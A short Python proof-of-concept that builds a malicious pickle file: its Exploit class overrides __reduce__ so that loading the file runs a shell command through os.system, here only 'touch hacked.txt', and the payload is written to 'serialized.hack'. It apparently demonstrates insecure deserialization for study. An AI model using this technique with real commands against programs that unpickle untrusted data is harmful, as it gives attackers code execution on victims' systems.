import os
import pickle

class Exploit(object):    
    def __reduce__(self):
        return (os.system, ('touch hacked.txt',))

serialized = pickle.dumps(Exploit())
filename = 'serialized.hack'

with open(filename, 'wb') as fobj:
    fobj.write(serialized)
    fobj.flush()
    fobj.close()
